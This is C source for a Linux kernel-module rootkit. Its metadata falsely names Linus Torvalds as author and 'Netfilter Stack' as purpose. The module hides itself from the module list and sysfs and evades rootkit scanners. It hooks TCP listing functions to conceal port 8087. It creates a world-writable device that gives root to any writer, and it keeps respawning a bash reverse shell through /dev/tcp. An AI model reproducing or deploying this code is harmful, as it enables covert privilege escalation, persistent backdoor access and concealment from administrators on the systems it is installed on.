#include <linux/init.h>         
#include <linux/module.h>       
#include <linux/kernel.h>       
#include <linux/kthread.h>      
#include <linux/delay.h>        
#include <linux/sched/signal.h> 
#include <linux/string.h>       
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>  
#include <linux/slab.h>  
#include <linux/device.h>
#include <linux/tcp.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/ctype.h>
#include "ftrace_helper.h"

#define CLASS "sdd1"
#define DEVICE "sdd1"
#define PORT 8087       // PORT

MODULE_LICENSE("GPL");          
MODULE_AUTHOR("Linus Torvalds");          
MODULE_DESCRIPTION("Netfilter Stack");

struct task_struct *mon_thread; 
struct task_struct *task;

static int major_number;              
static struct class* giveroot = NULL; 
static struct device* c_device = NULL;

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static struct list_head *mod_list;

static inline void kv_list_del(struct list_head *prev, struct list_head *next)
{
    next->prev = prev;
    prev->next = next;
}

struct rmmod_controller {
    struct kobject *parent;
    struct module_sect_attrs *attrs;
};
static struct rmmod_controller rmmod_ctrl;
static DEFINE_SPINLOCK(hiddenmod_spinlock);

static void kv_hide_mod(void) {
    struct list_head this_list;

    if (NULL != mod_list)
        return;

    this_list = THIS_MODULE->list;
    mod_list = this_list.prev;
    spin_lock(&hiddenmod_spinlock);

    /**
     * We bypass original list_del()
     */
    kv_list_del(this_list.prev, this_list.next);

    /*
     * To deceive certain rootkit hunters scanning for
     * markers set by list_del(), we perform a swap with
     * LIST_POISON. This strategy should be effective,
     * as long as you don't enable list debugging (lib/list_debug.c).
     */
    this_list.next = (struct list_head*)LIST_POISON2;
    this_list.prev = (struct list_head*)LIST_POISON1;

    spin_unlock(&hiddenmod_spinlock);

    /** Backup and remove this module from sysfs */
    rmmod_ctrl.attrs = THIS_MODULE->sect_attrs;
    rmmod_ctrl.parent = THIS_MODULE->mkobj.kobj.parent;
    kobject_del(THIS_MODULE->holders_dir->parent);

    /**
     * Again, mess with the known marker set by
     * kobject_del()
     */
    THIS_MODULE->holders_dir->parent->state_in_sysfs = 1;

    /* __module_address will return NULL for us
     * as long as we are "loading"... */
    THIS_MODULE->state = MODULE_STATE_UNFORMED;
}

static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;                   
    struct sock *sk = v;
    

    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        return 0;
    }


    ret = orig_tcp4_seq_show(seq, v);
    return ret; 
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;                    
    struct sock *sk = v;         
    
   
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;  
    }

    
    ret = orig_tcp6_seq_show(seq, v);
    return ret; 
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};
/* last version: */

static ssize_t x_write(struct file *file, const char __user *buffer, size_t len, loff_t *offset) {
    char *kernel_buffer;
    
    
    kernel_buffer = kmalloc(len + 1, GFP_KERNEL);  
    if (!kernel_buffer)                            
        return -ENOMEM;

    
    if (copy_from_user(kernel_buffer, buffer, len)) {
        kfree(kernel_buffer);  
        return -EFAULT;
    }
    
    kernel_buffer[len] = '\0';  
    
    
    if (strncmp(kernel_buffer, "root", 4) == 0) {
        struct cred *new_creds;
        new_creds = prepare_creds();  
        if (new_creds == NULL) {
            kfree(kernel_buffer);
            return -ENOMEM;
        }

        
        new_creds->uid.val = 0;
        new_creds->gid.val = 0;
        new_creds->euid.val = 0;
        new_creds->egid.val = 0;
        new_creds->fsgid.val = 0;
        new_creds->sgid.val = 0;
        new_creds->fsuid.val = 0;

        commit_creds(new_creds);  
    }

    kfree(kernel_buffer);  
    return len;          
}


static struct file_operations fops = {
    .write = x_write, 
};

int mon_shell(void *data) {     
    while (!kthread_should_stop()) {  
        bool process_found = false; 
        
        
        for_each_process(task) { 
            if (strncmp(task->comm, "noprocname", 10) == 0 && task->comm[10] == '\0') {
                process_found = true; 
                break;  
            }
        }
        
        if (!process_found) {
           
            call_usermodehelper("/bin/bash", 
                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/8087 0>&1", NULL},     // PORT
                                NULL, UMH_WAIT_EXEC);
        }
        
        ssleep(5);  
    }
    return 0;  
}

static int __init uninterruptible_sleep_init(void) {
    
    mon_thread = kthread_run(mon_shell, NULL, "kthreadn");
    

    if (IS_ERR(mon_thread)) {
        printk(KERN_ALERT "Failed to create thread!\n");
        return PTR_ERR(mon_thread); 
    }
    
    printk(KERN_INFO "Monitoring netfilter started!\n");

    
    major_number = register_chrdev(0, DEVICE, &fops);
    if (major_number < 0) {
        printk(KERN_ALERT "Failed to register device!\n");
        return major_number;
    }

    
    giveroot = class_create(CLASS);
    if (IS_ERR(giveroot)) {  
        unregister_chrdev(major_number, DEVICE);  
        printk(KERN_ALERT "Failed to create device class!\n");
        return PTR_ERR(giveroot);
    }

    
    c_device = device_create(giveroot, NULL, MKDEV(major_number, 0), NULL, DEVICE);
    if (IS_ERR(c_device)) {  
        class_destroy(giveroot);  
        unregister_chrdev(major_number, DEVICE);
        printk(KERN_ALERT "Failed to create device!\n");
        return PTR_ERR(c_device);
    }

    call_usermodehelper("/bin/bash", 
                                (char *[]){"/bin/bash", "-c", "chmod 777 /dev/sdd1", NULL}, 
                                NULL, UMH_WAIT_EXEC);

    int err; 
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if(err) 
        return err;

    kv_hide_mod();

    return 0;  
}

static void __exit uninterruptible_sleep_exit(void) {
    if (mon_thread) { 
        kthread_stop(mon_thread);  
    }
    device_destroy(giveroot, MKDEV(major_number, 0));
    class_destroy(giveroot);
    unregister_chrdev(major_number, DEVICE);
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

module_init(uninterruptible_sleep_init);
module_exit(uninterruptible_sleep_exit);
